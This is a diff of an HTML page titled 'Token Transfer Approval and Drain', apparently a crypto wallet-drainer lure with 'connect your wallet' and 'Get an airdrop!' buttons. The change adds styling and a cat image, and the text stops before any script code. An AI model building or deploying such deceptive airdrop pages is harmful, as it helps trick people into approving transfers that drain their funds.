@@ -4,11 +4,60 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Token Transfer Approval and Drain</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+            margin: 20px 0;
+        }
+
+        .content-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+        }
+
+        .funny-cat {
+            max-width: 300px;
+            border-radius: 15px;
+        }
+
+        button {
+            background-color: #ffcc00;
+            border: none;
+            color: #333;
+            padding: 10px 20px;
+            margin: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #ff9900;
+        }
+    </style>
 </head>
 <body>
-    <h1>SSO to the moon!!</h1>
-    <button id="connectButton">Click me to connect your wallet</button>
-    <button id="approveButton">Get an airdrop!</button>
+    <div class="content-container">
+        <img src="A_humorous_real_cat_dressed_as_a_security_soldier,.png" alt="Security Cat" class="funny-cat">
+        <h1>SSO to the moon!!</h1>
+        <button id="connectButton">Click me to connect your wallet</button>
+        <button id="approveButton">Get an airdrop!</button>
+    </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
     <script>
